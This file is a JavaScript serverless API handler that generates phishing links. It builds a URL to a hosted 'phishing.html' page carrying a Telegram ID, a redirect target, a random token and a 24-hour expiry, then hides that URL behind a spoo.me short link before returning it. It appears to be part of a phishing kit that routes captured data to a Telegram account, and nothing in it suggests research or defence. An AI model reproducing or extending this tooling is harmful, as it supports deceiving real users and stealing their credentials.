export default async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { telegramId, redirectUrl } = req.body;

    // Validate required fields
    if (!telegramId || !redirectUrl) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    // Generate unique token
    const token = [...Array(32)].map(() => Math.random().toString(36)[2]).join('');

    // Set expiration timestamp: 24 hours from now
    const expires = Date.now() + 24 * 60 * 60 * 1000;

    // Generate phishing URL
    const baseUrl = 'https://opaslabs.vercel.app/phishing/phishing.html';
    const phishingUrl = `${baseUrl}?telegramId=${telegramId}&redirectUrl=${encodeURIComponent(redirectUrl)}&token=${token}&expires=${expires}`;

    // Attempt to shorten URL using spoo.me
    try {
      const shortenResponse = await fetch('https://spoo.me/', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/x-www-form-urlencoded',
          'Accept': 'application/json'
        },
        body: new URLSearchParams({ url: phishingUrl })
      });

      const data = await shortenResponse.json();

      // Handle different response formats from Spoo.me
      const shortUrl = data.short_url || 
                      (data.url && data.url.short) || 
                      (data.result && data.result.short_url);

      if (shortUrl) {
        return res.status(200).json({ link: shortUrl });
      }

      // Log API error if no short URL was returned
      console.error('Spoo.me API Error:', data.message || 'Unknown error');
    } catch (shortenError) {
      console.error('URL shortening failed:', shortenError.message);
    }

    // Fallback to original phishing URL if shortening fails
    res.status(200).json({ link: phishingUrl });

  } catch (error) {
    console.error('Generation error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
};
